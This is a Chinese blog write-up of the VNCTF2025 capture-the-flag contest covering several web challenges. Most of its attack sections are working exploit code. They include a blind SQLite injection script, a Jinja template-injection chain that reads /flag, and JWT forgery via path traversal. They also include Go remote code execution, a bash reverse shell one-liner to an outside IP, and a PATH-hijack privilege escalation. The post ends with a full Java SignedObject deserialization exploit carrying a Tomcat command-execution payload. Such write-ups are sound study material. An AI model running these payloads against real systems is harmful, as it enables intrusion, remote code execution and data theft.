+++
title = "VNCTF2025"
slug = "vnctf2025"
description = "燃尽了XD"
date = "2025-02-08T10:00:21"
lastmod = "2025-02-08T10:00:21"
image = ""
license = ""
categories = ["赛题"]
tags = ["Fastjson", "go", "ssti", "sqlite"]
+++

![1](QQ20250209-224527.jpg)

总排第七，差一道AKWeb哎，难受

## **奶龙回家**

爆破了很久的弱密码，发现`======`会触发另外一个回显

![1](QQ20250208-140255.jpg)

就感觉是注入了，然后写查询语句，发现万能密码都被过滤了，但是fuzz出来了这个东西会触发另外一种回显，

```
'randomblob(N)--
```

![1](QQ20250208-140405.jpg)

可以确定是sqlite注入了，慢慢测试发现就过滤了`union`，绕过这个应该就可以拿到了

```
'UNION/**/select/**/sql/**/from/**/sqlite_schema--
```

写出延时语句

```
payload = "'OR/**/(case/**/when(substr(sqlite_version(),1,1)<'310')/**/then/**/randomblob(1000000000)/**/else/**/0/**/end);--"
```

然后写脚本，有些函数`sqlite`是没有的，所以只能慢慢写

```python
import requests

url = 'http://node.vnteam.cn:47163/login'
result = ''
for i in range(1, 50):
    head = 32
    tail = 127
    while head < tail:
        mid = (head + tail) // 2
        # payload = 'sqlite_version()'
        # payload = 'select/**/group_concat(sql)/**/from/**/sqlite_master'
        # payload = 'select/**/group_concat(sql)/**/FROM/**/sqlite_master/**/WHERE/**/type=\'table\'/**/AND/**/name=\'users\';'
        # payload = 'select/**/group_concat(username)/**/from/**/users'
        payload = 'select/**/group_concat(password)/**/from/**/users'
        username = 'baozongwi'
        char = chr(mid)
        password = "'or/**/(case/**/when(substr(({}),{},1)>'{}')/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--".format(
            payload, i, char)
        json = {
            "username": username,
            "password": password
        }
        try:
            res = requests.post(url=url, json=json, timeout=3)
        except Exception:
            head = mid + 1
            print(f'\r[*]trying: {result}[{head}-{tail}]', end='')
        else:
            tail = mid
            print(f'\r[*]trying: {result}[{head}-{tail}]', end='')

    result += chr(head)
    print(f'\r[*]result: {result}')

```

```
nailong\woaipangmao114514
```

不稳定，基本上一个靶机只有第一次跑的是对的，其他的都是乱的

## **学生姓名登记系统**

```
{{7+7}}
```

测试很久发现可以类似的`config.update`进行叠加，但是这里使用的是`:=`

```
{{a:=().__class__}}
{{b:=a.__base__}}
{{c:=b.__subclasses__}}
{{d:=c()[154]}}
{{e:=d.__init__}}
{{f:=e.__globals__}}
{{x:='__builtins__'}}
```

```
{{a:=().__class__}}
{{b:=a.__base__}}
{{c:=b.__subclasses__}}
{{d:=c()[154]}}
{{e:=d.__init__}}
{{f:=e.__globals__}}
{{x:='__builtins__'}}
{{g:=f[x]}}
{{h:=g['op''en']}}
{{i:=h('/flag')}}
{{j:=i.read()}}
```

就可以了

## **Gin**

进来先看路由，发现应该是最开始要进行一个越权，然后再操作

```go
package routes

import (
	"GinTest/controllers"
	"GinTest/middleware"
	"github.com/gin-gonic/gin"
	"net/http"
)

func SetupRoutes(r *gin.Engine) *gin.Engine {
	r.GET("/", func(c *gin.Context) {
		c.Redirect(http.StatusFound, "/login")
	})
	r.GET("/register", func(c *gin.Context) {
		c.File("./static/register.html")
	})
	r.POST("/register", controllers.Register)
	r.GET("/login", func(c *gin.Context) {
		c.File("./static/login.html")
	})
	r.POST("/login", controllers.Login)
	r.GET("/user", middleware.AuthMiddleware("user"), func(c *gin.Context) {
		c.File("./static/user.html")
	})
	r.POST("/upload", middleware.AuthMiddleware("upload"), controllers.Upload)
	r.GET("/download", middleware.AuthMiddleware("download"), controllers.Download)
	r.GET("/admin", middleware.AuthMiddleware("admin"), func(c *gin.Context) {
		c.File("./static/admin.html")
	})
	r.POST("/eval", middleware.AuthMiddleware("admin"), controllers.Eval)
	return r
}
```

看到jwt这里使用的是伪随机数

```go
package utils

import (
	"GinTest/config"
	"fmt"
	"github.com/golang-jwt/jwt/v4"
	"math/rand"
	"time"
)

type JWTClaims struct {
	Username string `json:"username"`
	jwt.RegisteredClaims
}

func GenerateKey() string {
	rand.Seed(config.Year())
	randomNumber := rand.Intn(1000)
	key := fmt.Sprintf("%03d%s", randomNumber, config.Key())
	return key
}

func GenerateToken(username string) (string, error) {
	key := GenerateKey()
	claims := JWTClaims{
		Username: username,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
			Issuer:    "Mash1r0",
			Subject:   "user token",
		},
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)

	signedToken, err := token.SignedString([]byte(key))
	if err != nil {
		return "", fmt.Errorf("生成 token 时出错: %v", err)
	}
	return signedToken, nil
}

func ParseToken(tokenString string) (*JWTClaims, error) {
	key := GenerateKey()
	token, err := jwt.ParseWithClaims(tokenString, &JWTClaims{}, func(token *jwt.Token) (interface{}, error) {
		return []byte(key), nil
	})

	if err != nil {
		return nil, fmt.Errorf("解析 token 时出错: %v", err)
	}

	if claims, ok := token.Claims.(*JWTClaims); ok && token.Valid {
		return claims, nil
	} else {
		return nil, fmt.Errorf("无效的 token")
	}
}
```

看看控制器，如果有权限的话能干嘛

```go
package controllers

import (
	"GinTest/config"
	"GinTest/model"
	"GinTest/response"
	"GinTest/utils"
	"bufio"
	"fmt"
	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/bcrypt"
	"gorm.io/gorm"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
)

var DB = config.InitDB()

func Register(c *gin.Context) {
	var requestUser = model.User{}
	c.Bind(&requestUser)
	username := requestUser.Username
	password := requestUser.Password

	if len(username) == 0 || len(password) == 0 {
		response.Response(c, http.StatusBadRequest, 400, nil, "账号或密码不能为空")
		return
	}

	if len(password) < 6 {
		response.Response(c, http.StatusBadRequest, 400, nil, "密码不能小于6位")
		return
	}

	if isUserExist(DB, username) {
		response.Response(c, http.StatusConflict, 409, nil, "用户已存在")
		return
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		response.Response(c, http.StatusInternalServerError, 500, nil, "加密错误")
		log.Printf("password hashing failed: %v", err)
		return
	}
	newUser := model.User{
		Username: username,
		Password: string(hashedPassword),
	}
	DB.Create(&newUser)
	response.Success(c, nil, "注册成功")
}

func isUserExist(db *gorm.DB, username string) bool {
	user := model.User{}
	db.Where("username = ?", username).First(&user)
	if user.ID != 0 {
		return true
	}
	return false
}

func Login(c *gin.Context) {
	var requestUser = model.User{}
	c.Bind(&requestUser)
	username := requestUser.Username
	password := requestUser.Password

	if len(username) == 0 || len(password) == 0 {
		response.Response(c, http.StatusBadRequest, 400, nil, "账号或密码不能为空")
		return
	}

	if len(password) < 6 {
		response.Response(c, http.StatusBadRequest, 400, nil, "密码不能小于6位")
		return
	}

	user := model.User{}
	DB.Where("username = ?", username).First(&user)
	if user.ID == 0 {
		response.Response(c, http.StatusNotFound, 404, nil, "用户不存在")
		return
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password)); err != nil {
		response.Response(c, http.StatusUnauthorized, 401, nil, "密码错误")
		log.Printf("密码错误：%v", err)
		return
	}

	token, err := utils.GenerateToken(user.Username)
	if err != nil {
		response.Response(c, http.StatusInternalServerError, 500, nil, "加密错误")
		log.Printf("token generate error: %v", err)
	}

	response.Success(c, gin.H{"token": token}, "登录成功")
}

func Upload(c *gin.Context) {
	file, _ := c.FormFile("file")
	contentDisposition := file.Header["Content-Disposition"][0]
	filename := parseFilenameFromContentDisposition(contentDisposition)
	if filename == "" {
		fmt.Println("Failed to parse filename from Content-Disposition")
		return
	}
	in, _ := file.Open()
	log.Println(in)
	defer in.Close()
	hasMaliciousContent, err := containsMaliciousContent(in)
	if err != nil {
		response.Response(c, http.StatusInternalServerError, 500, nil, "Error checking file content")
		return
	}
	if hasMaliciousContent {
		response.Response(c, http.StatusBadRequest, 400, nil, "File contains malicious content")
		return
	}
	in.Seek(0, io.SeekStart)
	basepath := "./uploads"
	filepath, _ := url.JoinPath(basepath, filename)
	out, _ := os.Create(filepath)
	defer out.Close()
	log.Println(in)
	io.Copy(out, in)
	log.Println(out)
	log.Println(filepath)
	downloadLink := "/download?filename=" + filename
	response.Success(c, gin.H{"filepath": filepath, "downloadLink": downloadLink}, "upload success")
}

func parseFilenameFromContentDisposition(contentDisposition string) string {
	parts := strings.Split(contentDisposition, ";")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(part, "filename=") {
			filename := strings.TrimPrefix(part, "filename=")
			filename = strings.Trim(filename, `"`) 
			return filename
		}
	}
	return ""
}

func containsMaliciousContent(file multipart.File) (bool, error) {
	maliciousPatterns := []string{
		"package",
		"<script>",
		"eval(",
		"base64",
		"file://",
		"exec",
		"flag",
		"cat",
		"bash",
		"/bin",
		"import",
	}

	reader := bufio.NewReader(file)

	for {
		line, err := reader.ReadString('\n')
		if err != nil && err != io.EOF {
			return false, err
		}

		for _, pattern := range maliciousPatterns {
			if strings.Contains(line, pattern) {
				return true, nil
			}
		}

		if err == io.EOF {
			break
		}
	}
	return false, nil
}

func Download(c *gin.Context) {
	filename := c.DefaultQuery("filename", "")
	if filename == "" {
		response.Response(c, http.StatusBadRequest, 400, nil, "Filename is required")
	}
	basepath := "./uploads"
	filepath, _ := url.JoinPath(basepath, filename)
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		response.Response(c, http.StatusBadRequest, 404, nil, "File not found")
	}
	c.Header("Content-Disposition", "attachment; filename="+filename)
	c.File(filepath)
}

func Eval(c *gin.Context) {
	code := c.PostForm("code")
	log.Println(code)
	if code == "" {
		response.Response(c, http.StatusBadRequest, 400, nil, "No code provided")
		return
	}
	log.Println(containsBannedPackages(code))
	if containsBannedPackages(code) {
		response.Response(c, http.StatusBadRequest, 400, nil, "Code contains banned packages")
		return
	}
	tmpFile, err := ioutil.TempFile("", "goeval-*.go")
	if err != nil {
		log.Println("Error creating temp file:", err)
		response.Response(c, http.StatusInternalServerError, 500, nil, "Error creating temporary file")
		return
	}
	defer os.Remove(tmpFile.Name())

	_, err = tmpFile.WriteString(code)
	if err != nil {
		log.Println("Error writing code to temp file:", err)
		response.Response(c, http.StatusInternalServerError, 500, nil, "Error writing code to temp file")
		return
	}

	cmd := exec.Command("go", "run", tmpFile.Name())
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Println("Error running Go code:", err)
		response.Response(c, http.StatusInternalServerError, 500, gin.H{"error": string(output)}, "Error executing code")
		return
	}

	response.Success(c, gin.H{"result": string(output)}, "success")
}

func containsBannedPackages(code string) bool {
	importRegex := `(?i)import\s*\((?s:.*?)\)`
	re := regexp.MustCompile(importRegex)
	matches := re.FindStringSubmatch(code)
	imports := matches[0]
	log.Println(imports)
	if strings.Contains(imports, "os/exec") {
		return true
	}

	return false
}
```

那么有思路了，但是jwt的key这里就给我卡着了，去网页测测看看有没有东西，发现文件上传的地方可以目录穿梭

![1](QQ20250208-173258.jpg)

并且在`/download`路由也可以进行类似的目录遍历来下载文件，只不过文件名是被处理过的，仔细看这里的路径处理

![1](QQ20250208-174102.jpg)

直接对路径进行了拼接，所以我们可以大胆尝试

```
/download?filename=../main.go
/download?filename=../config/key.go
```

“震惊”，下载到了

```go
package config

func Key() string {
	return "r00t32l"
}
func Year() int64 {
	return 2025
}
```

然后把密钥拿到

```go
package main

import (
	"fmt"
	"math/rand"
)

func Key() string {
	return "r00t32l"
}

func Year() int64 {
	return 2025
}

func GenerateKey() string {
	rand.Seed(Year())
	randomNumber := rand.Intn(1000)
	key := fmt.Sprintf("%03d%s", randomNumber, Key())
	return key
}

func main() {
	key := GenerateKey() // 调用 GenerateKey 函数生成密钥
	fmt.Println("Generated Key:", key) // 打印生成的密钥
}
// Generated Key: 122r00t32l
```

然后看看`/admin`，伪造cookie看看

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSIsImlzcyI6Ik1hc2gxcjAiLCJzdWIiOiJ1c2VyIHRva2VuIiwiZXhwIjoxNzM5MDk1MjgwLCJpYXQiOjE3MzkwMDg4ODB9.Zg-vmBLmyJybP296MBi-X95rmUAiFxNhNKxa6hZ3gJQ

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN1YiI6InVzZXIgdG9rZW4iLCJleHAiOjE3MzkwOTUyODAsImlhdCI6MTczOTAwODg4MH0.MU6y5-2-f-pJNo6qhjPnZ2cBNC1mZspwH-qA6us5y_0
```

把`username`一改就可以了，就可以进行代码执行了，绕过即可

![1](QQ20250208-180500.jpg)

看代码发现把`os`给禁用了，需要寻找另外一种方法来RCE，这里使用`goeval`

```go
package main
 
import (
	"fmt"
	"github.com/PaulXu-cn/goeval"
)
 
func main()  {
 
	Package := "\"os/exec\"\n fmt\"\n)\n\nfunc\tinit(){\ncmd:=exec.Command(\"ls\",\"/\")\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n}\n\n\nvar(a=\"1"
	eval, _ := goeval.Eval("", "fmt.Println(\"Good\")", Package)
	fmt.Println(string(eval))
 
}
```

查看flag发现不是，然后准备看root目录发现权限没了

![1](QQ20250208-195150.jpg)

`env`命令得到这个

```
Execution Successful! Result:
--------------------------------
SHELL        : /bin/bash
SUDO_GID     : 0
HOSTNAME     : ret2shell-47-117
SUDO_COMMAND  : /bin/bash
SUDO_USER    : root
PWD          : /GinTest
LOGNAME      : ctfer
HOME         : /home/ctfer
TERM         : unknown
USER         : ctfer
GOPROXY      : https://proxy.golang.org,direct
SHLVL        : 1
PATH         : /usr/local/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin
SUDO_UID     : 0
MAIL         : /var/mail/ctfer
OLDPWD       : /home/ctfer
_            : ./GinTest

Good
```

后面问GPT发现了更优美的poc，终于能找suid位了

```go
package main

import (
    "syscall"
)

func main() {
    syscall.Exec("/bin/sh", []string{"sh", "-c", "ls /"}, []string{})
}
```

进行sui提权

```
find / -perm -u=s -type f 2>/dev/null
```

![1](QQ20250208-212413.jpg)

始终提不了，先弹shell吧

```
bash -c 'bash -i >& /dev/tcp/156.238.233.9/4444 <&1'
```

然后把文件下载下来

![1](QQ20250208-220140.jpg)

怪不得，现在问题就是环境变量提权了，在里面穿插一个cat来达到目的

[文章1](https://blog.csdn.net/nicai321/article/details/122275160) [文章2](https://www.cnblogs.com/1vxyz/articles/17659773.html)

```
cd /tmp
echo "/bin/bash" > cat
chmod +x cat
echo $PATH
export PATH=/tmp:$PATH
/.../Cat
```

然后就是root了

## **easymath**

用AI做

```python
from Crypto.Util.number import *
from secret import flag
flag=bytes_to_long(flag)
l=flag.bit_length()//3 + 1
n=[]
N=1
while len(n) < 3:
    p = 4*getPrime(l)-1
    if isPrime(p):
        n.append(p)
        N *= p

print(f'c={flag*flag%N}')

from sympy import symbols, expand
x = symbols('x')
polynomial = expand((x - n[0]) * (x - n[1]) * (x - n[2]))

print(f'{polynomial=}')
# c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944
# polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619
```

不过中途要给我笑死了

![1](QQ20250208-213120.jpg)

```python
from sympy import symbols, solve, isprime
from sympy.ntheory.modular import crt
import binascii
from itertools import product

# 用户提供的参数
polynomial_str = "x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619"
c = 24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944

# 解三次方程并返回可能的质数根
def find_prime_roots(expr):
    # 解方程
    x = symbols('x')
    roots = solve(expr, x)
    candidates = [int(root.round()) for root in roots]  # 四舍五入并转换为整数

    # 筛选出质数
    primes = [p for p in candidates if isprime(p)]
    return sorted(primes, reverse=True)  # 从大到小排序

# 解二次剩余方程，使用 Tonelli-Shanks 算法
def tonelli_shanks(n, p):
    if pow(n, (p - 1) // 2, p) != 1:
        return None  # 不是二次剩余
    return pow(n, (p + 1) // 4, p)

# 使用 Chinese Remainder Theorem (CRT) 合并解
def apply_crt(moduli, solutions):
    possible_flags = []
    for sol in solutions:
        res = crt(moduli, sol)
        if res is not None:
            possible_flags.append(res[0])
    return list(set(possible_flags))  # 去重

# 解码 flag
def decode_flag(f):
    try:
        flag_bytes = int.to_bytes(f, length=(f.bit_length() + 7) // 8, byteorder='big')
        return flag_bytes.decode()
    except UnicodeDecodeError:
        return None  # 解码失败

# 主程序
def main():
    # 定义方程表达式
    expr = symbols('x')**3 - 15264966144147258587171776703005926730518438603688487721465 * symbols('x')**2 + \
           76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923 * symbols('x') - \
           125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619

    # 查找质数根
    primes = find_prime_roots(expr)
    print(f"找到的质数: {primes}")

    if len(primes) < 3:
        print("没有找到足够的质数根，无法继续解密")
        return

    p0, p1, p2 = primes[:3]  # 获取前3个质数

    # 计算 N
    N = p0 * p1 * p2
    print(f"N = {N}")

    # 确保 c 是正确的模数
    assert c < N, "c 的值超出模数范围"

    # 计算二次剩余的解
    r0 = tonelli_shanks(c, p0)
    r1 = tonelli_shanks(c, p1)
    r2 = tonelli_shanks(c, p2)

    if any(r is None for r in [r0, r1, r2]):
        print("无法找到二次剩余的解，计算终止")
        return

    # 生成所有可能的符号组合
    signs = list(product([+1, -1], repeat=3))
    solutions = [(sign[0] * r0 % p0, sign[1] * r1 % p1, sign[2] * r2 % p2) for sign in signs]

    # 使用 CRT 合并解
    moduli = [p0, p1, p2]
    possible_flags = apply_crt(moduli, solutions)

    # 去重并检查可能的解
    possible_flags = [f for f in possible_flags if f**2 % N == c]

    # 输出所有可能的解
    print("可能的 flag 解密结果:")
    for f in possible_flags:
        if f < 0:
            f += N  # 保证解在正数范围内
        decoded_flag = decode_flag(f)
        if decoded_flag:
            print(f"解码后的 flag: {decoded_flag}")
        else:
            print(f"候选解: {f}（解码失败）")

if __name__ == "__main__":
    main()

```

调的时间比较久，Deepseek好使但是不完全好使

## **VN_Lang**

![1](QQ20250208-213942.jpg)

## **javaGuide**

主要是`SignedObject`二次反序列化,并且不出网，网上参考很多，我这个小白都会打

```
1. 反序列化入口点：ArrayList.readObject()
   ↓
2. 处理第一个元素：SignedObject.readObject()
   ↓
3. 反序列化内部对象：HashMap.readObject()
   ↓
4. 处理HashMap键对象：动态代理(Proxy)的hashCode计算
   ↓
5. 触发InvocationHandler.invoke() → JdkDynamicAopProxy.invoke()
   ↓
6. 调用目标对象方法：TemplatesImpl.getOutputProperties()
   ↓
7. 加载恶意字节码：TemplatesImpl._bytecodes中的TomcatEchoPayload
   ↓
8. 执行静态初始化代码：TomcatEchoPayload.<clinit>()中的恶意代码
```

exp

```java
package org.example.exp;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.bind.DatatypeConverter;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Vector;

import static ysoserial.payloads.util.Reflections.getFieldValue;

//import static ysoserial.payloads.util.Reflections.setFieldValue;

public class exp {

    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {
        Field f = object.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(object, arg);
    }


    public static void main(String[] args) throws Exception {

        Object template = makeTemplatesImplAopProxy();
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(signedObject);

        JSONArray jsonArray1 = new JSONArray();
        jsonArray1.add(signedObject);

        EventListenerList badAttributeValueExpException1 = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(jsonArray1);
        setFieldValue(badAttributeValueExpException1, "listenerList", new Object[]{InternalError.class, manager});

        arrayList.add(badAttributeValueExpException1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(arrayList);
        oos.close();
        System.out.println(DatatypeConverter.printHexBinary(barr.toByteArray()));
        System.out.println(java.util.Base64.getEncoder().encodeToString(barr.toByteArray()));
        ObjectInputStream myObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        myObjectInputStream.readObject();

    }

    public static Object makeTemplatesImplAopProxy() throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ClassPool.getDefault().get(TomcatEchoPayload.class.getName()).toBytecode()});
        setFieldValue(templates, "_name", "TomcatEchoPayload");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
}
```

其中`TomcatEchoPayload`这个类是使用的`ysomap`里面这个比较基本的类，不过要自己写在同一目录

```java
package org.example.exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

/**
 * @author wh1t3P1g
 * @since 2021/6/16
 */
public class TomcatEchoPayload extends AbstractTranslet implements Serializable {

    public TomcatEchoPayload() throws Exception {
        transletVersion = 101;
        Object o;
        Object resp;
        String s;
        boolean done = false;
        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < ts.length; i++) {
            Thread t = ts[i];
            if (t == null) {
                continue;
            }
            s = t.getName();
            if (!s.contains("exec") && s.contains("http")) {
                o = getFV(t, "target");
                if (!(o instanceof Runnable)) {
                    continue;
                }

                try {
                    o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }

                java.util.List ps = (java.util.List) getFV(o, "processors");
                for (int j = 0; j < ps.size(); j++) {
                    Object p = ps.get(j);
                    o = getFV(p, "req");
                    resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testecho"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", s});
                        done = true;
                    }
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testcmd"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", s} : new String[]{"/bin/sh", "-c", s};
                        writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                        done = true;
                    }
                    if ((s == null || s.isEmpty()) && done) {
                        writeBody(resp, System.getProperties().toString().getBytes());
                    }

                    if (done) {
                        break;
                    }
                }
                if (done) {
                    break;
                }
            }
        }
    }

    private static void writeBody(Object resp, byte[] bs) throws Exception {
        Object o;
        Class clazz;
        try {
            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            o = clazz.newInstance();
            clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class})
                    .invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        } catch (ClassNotFoundException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        } catch (NoSuchMethodException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        }
    }

    private static Object getFV(Object o, String s) throws Exception {
        java.lang.reflect.Field f = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        }
        f.setAccessible(true);
        return f.get(o);
    }



    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

然后运行得到字节码打入即可

```http
POST /deser HTTP/1.1
Host: node.vnteam.cn:44391
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: commentposter=baozongwi; postermail=2405758945%40qq.com; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1
TestCmd: cat /f*
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded

payload={{urlencode(rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4AA0wADHRoZWFsZ29yaXRobXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdXIAAltCrPMX+AYIVOACAAB4cAAAHwOs7QAFc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAFzfQAAAAEAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5KZGtEeW5hbWljQW9wUHJveHlMxLRxDuuW/AIAA1oADWVxdWFsc0RlZmluZWRaAA9oYXNoQ29kZURlZmluZWRMAAdhZHZpc2VkdAAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc2VkU3VwcG9ydDt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAGWgALcHJlRmlsdGVyZWRbAAxhZHZpc29yQXJyYXl0ACJbTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL0Fkdmlzb3I7TAATYWR2aXNvckNoYWluRmFjdG9yeXQAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNvckNoYWluRmFjdG9yeTtMAAhhZHZ